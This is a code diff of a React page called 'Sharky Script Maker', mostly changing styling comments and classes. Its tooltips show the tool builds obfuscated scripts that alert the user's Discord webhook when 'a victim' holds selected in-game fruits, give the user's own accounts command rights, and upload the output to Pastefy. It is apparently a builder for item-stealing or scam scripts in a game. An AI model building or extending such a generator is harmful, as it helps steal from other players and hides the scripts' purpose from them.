@@ -208,17 +208,20 @@ export default function Home() {
   return (
     <>
       <ParticleComponent />
-      {/* Removed neon-text from outer container, set base text color */}
+      {/* Base text color set here */}
       <div className="flex flex-col items-center justify-center min-h-screen p-4 text-gray-100">
-        {/* Set base text color inside the main content card for better clarity */}
+        {/* Container with background and base text color */}
         <div className="container mx-auto max-w-3xl w-full bg-gray-800 bg-opacity-80 p-8 rounded-lg border border-cyan-500/30 shadow-lg shadow-cyan-500/20 z-10 text-gray-100">
-          {/* Main Title: Keep neon color but remove heavy shadow if it was causing blur */}
-          <h1 className="text-3xl font-bold mb-8 text-center text-cyan-400 font-orbitron">Sharky Script Maker</h1>
+
+          {/* Apply the custom neon glow class to the main title */}
+          <h1 className="text-3xl font-bold mb-8 text-center text-neon-blue-glow">
+            Sharky Script Maker
+          </h1>
 
           {/* Webhook Section */}
           <div className="mb-4">
              <div className="flex items-center space-x-2 mb-2">
-                {/* Label: Keep neon color */}
+                {/* Label: Use a standard highlight color, not the full glow */}
                 <Label htmlFor="webhookUrl" className="text-cyan-400 font-bold">Protected WebhookURL</Label>
                 <TooltipProvider>
                   <Tooltip
@@ -226,12 +229,11 @@ export default function Home() {
                     onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, webhookUrl: open })}
                   >
                     <TooltipTrigger asChild>
-                      {/* Icon Button: Keep default styling */}
                       <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('webhookUrl'); } }}>
-                        <HelpCircle className="h-4 w-4 text-gray-400" /> {/* Ensure icon has clear color */}
+                        <HelpCircle className="h-4 w-4 text-gray-400" />
                       </Button>
                     </TooltipTrigger>
-                    {/* Tooltip Content: Use clear base text, highlight link */}
+                    {/* Tooltip Content: Use standard text colors */}
                     <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
                         <p className="mb-2">Enter your <b>Protected Webhook URL</b> to receive notifications when the script detects a fruit.</p>
                         <p className="mb-2">First make a Discord Webhook, and then protect it here --&gt;{' '}
@@ -244,7 +246,7 @@ export default function Home() {
                   </Tooltip>
                 </TooltipProvider>
               </div>
-              {/* Input: Use clear text color */}
+              {/* Input: Standard text color */}
               <Input
                 type="text"
                 id="webhookUrl"
@@ -254,9 +256,9 @@ export default function Home() {
                     if (webhookError) setWebhookError(null);
                 }}
                 placeholder="Enter your protected webhook URL"
-                className={`w-full p-3 bg-gray-900 border rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent ${webhookError ? 'border-red-500' : 'border-cyan-500/50'}`} // Ensure text is clear
+                className={`w-full p-3 bg-gray-900 border rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent ${webhookError ? 'border-red-500' : 'border-cyan-500/50'}`}
               />
-              {/* Error Display: Keep red text for error, blue for link */}
+              {/* Error Display: Standard error/link colors */}
               {webhookError && (
                 <div className="mt-1">
                   <p className="text-sm text-red-400">{webhookError.message}</p>
@@ -277,7 +279,7 @@ export default function Home() {
           {/* Usernames Section */}
           <div className="mb-4">
               <div className="flex items-center space-x-2 mb-2">
-                {/* Label: Keep neon color */}
+                {/* Label: Standard highlight color */}
                 <Label htmlFor="usernames" className="text-cyan-400 font-bold">Usernames (one per line)</Label>
                   <TooltipProvider>
                      <Tooltip
@@ -286,10 +288,10 @@ export default function Home() {
                     >
                       <TooltipTrigger asChild>
                         <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('usernames'); } }}>
-                          <HelpCircle className="h-4 w-4 text-gray-400" /> {/* Ensure icon has clear color */}
+                          <HelpCircle className="h-4 w-4 text-gray-400" />
                         </Button>
                       </TooltipTrigger>
-                      <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}> {/* Use clear base text */}
+                      <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
                           <ul>
                             <li>Enter usernames of <b>YOUR</b> accounts.</li>
                             <li>These will be the accounts that can use the script's commands.</li>
@@ -300,13 +302,13 @@ export default function Home() {
                     </Tooltip>
                   </TooltipProvider>
               </div>
-              {/* Textarea: Use clear text color */}
+              {/* Textarea: Standard text color */}
               <Textarea
                 id="usernames"
                 value={usernames}
                 onChange={e => setUsernames(e.target.value)}
                 placeholder="Enter usernames, one per line"
-                className="w-full p-3 bg-gray-900 border border-cyan-500/50 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent" // Ensure text is clear
+                className="w-full p-3 bg-gray-900 border border-cyan-500/50 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent"
                 style={{fontFamily: 'Roboto Mono, monospace'}}
               />
           </div>
@@ -314,7 +316,7 @@ export default function Home() {
           {/* Fruits Section */}
           <div className="mb-4">
               <div className="flex items-center space-x-2 mb-2">
-                 {/* Label: Keep neon color */}
+                 {/* Label: Standard highlight color */}
                 <Label className="text-cyan-400 font-bold">Fruits to Hit</Label>
                  <TooltipProvider>
                      <Tooltip
@@ -323,10 +325,10 @@ export default function Home() {
                     >
                       <TooltipTrigger asChild>
                         <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('fruitsToHit'); } }}>
-                          <HelpCircle className="h-4 w-4 text-gray-400" /> {/* Ensure icon has clear color */}
+                          <HelpCircle className="h-4 w-4 text-gray-400" />
                         </Button>
                       </TooltipTrigger>
-                      <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}> {/* Use clear base text */}
+                      <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
                           <ul>
                             <li>Select the fruits you want the script to detect.</li>
                             <li>You will get notified through your webhook on Discord if a victim has any of the selected fruits in their inventory.</li>
@@ -335,7 +337,7 @@ export default function Home() {
                     </Tooltip>
                   </TooltipProvider>
               </div>
-              {/* Checkbox Area: Use clear text for labels */}
+              {/* Checkbox Area: Standard text color for labels */}
               <div className="grid grid-cols-2 md:grid-cols-4 gap-2 p-3 bg-gray-900 border border-cyan-500/50 rounded-md">
                 {sortedFruitsByRarity.map(fruit => (
                   <div key={fruit} className="flex items-center space-x-2">
@@ -345,10 +347,9 @@ export default function Home() {
                       onCheckedChange={() => handleFruitSelect(fruit)}
                       className="border-cyan-500/50 data-[state=checked]:bg-cyan-500 data-[state=checked]:text-gray-900"
                     />
-                    {/* Checkbox Label: Use clear text color */}
                     <label
                       htmlFor={fruit}
-                      className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 cursor-pointer text-gray-100" // Ensure clear text
+                      className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 cursor-pointer text-gray-100" // Standard text
                     >
                       {fruit}
                     </label>
@@ -357,7 +358,7 @@ export default function Home() {
               </div>
           </div>
 
-          {/* Generate Button (Style remains the same - gradient provides highlight) */}
+          {/* Generate Button (remains the same) */}
           <div className="mb-4">
             <Button onClick={generateScript} className="w-full mt-4 p-4 bg-gradient-to-r from-cyan-500 to-purple-600 text-gray-900 font-bold rounded-md hover:from-cyan-400 hover:to-purple-500 transition duration-300 ease-in-out disabled:opacity-50 disabled:cursor-not-allowed" disabled={isGenerating}>
               {isGenerating ? 'Generating...' : 'Generate Script'}
@@ -373,15 +374,15 @@ export default function Home() {
                  <Button
                     onClick={() => copyToClipboard(configuredScript, 'Configured script copied.')}
                     variant="outline" size="sm"
-                    className="bg-gray-600 hover:bg-gray-500 text-gray-100 border-gray-500 px-2 py-1" // Use clear text
+                    className="bg-gray-600 hover:bg-gray-500 text-gray-100 border-gray-500 px-2 py-1"
                     >
                     <Copy className="h-3 w-3 mr-1" /> Copy
                  </Button>
               </div>
-              {/* Textarea: Use clear text */}
+              {/* Textarea: Standard text color */}
               <Textarea
                 value={configuredScript} readOnly
-                className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-100 opacity-90" // Ensure clear text, slightly less opacity maybe
+                className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-100 opacity-90"
                 rows={8} style={{ fontFamily: 'Roboto Mono, monospace' }}
               />
             </div>
@@ -391,35 +392,35 @@ export default function Home() {
           {obfuscatedScript && (
             <div className="mb-4">
                <div className="flex justify-between items-center mb-2">
-                 {/* Label: Keep highlight color */}
+                  {/* Label: Keep highlight color */}
                  <Label className="text-green-400 font-bold">Obfuscated Script</Label>
                  <Button
                     onClick={() => copyToClipboard(obfuscatedScript, 'Obfuscated script copied.')}
                     variant="outline" size="sm"
-                    className="bg-green-600 hover:bg-green-500 text-gray-900 border-green-700 px-2 py-1" // Keep contrast text
+                    className="bg-green-600 hover:bg-green-500 text-gray-900 border-green-700 px-2 py-1"
                     >
                     <Copy className="h-3 w-3 mr-1" /> Copy
                  </Button>
               </div>
               {pastefyLink && (
                 <div className="mb-2 text-sm">
-                  {/* Link Text: Keep highlight color */}
+                  {/* Link: Keep highlight color */}
                   <span className="text-gray-400">Pastefy Link: </span>
                   <a href={pastefyLink} target="_blank" rel="noopener noreferrer" className="text-cyan-400 hover:underline break-all">
                     {pastefyLink}
                   </a>
                 </div>
               )}
-              {/* Textarea: Use clear text */}
+              {/* Textarea: Standard text color */}
               <Textarea
                 value={obfuscatedScript} readOnly
-                className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-100 opacity-90" // Ensure clear text
+                className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-100 opacity-90"
                 rows={8} style={{ fontFamily: 'Roboto Mono, monospace' }}
               />
             </div>
           )}
 
-          {/* Download Button: Keep neon text for highlight */}
+          {/* Download Button: Keep highlight color */}
            <Button
               onClick={downloadScript}
               className="w-full mt-4 p-4 border border-cyan-500/50 text-cyan-400 bg-gray-800 hover:bg-gray-700 rounded-md disabled:opacity-50 disabled:cursor-not-allowed"
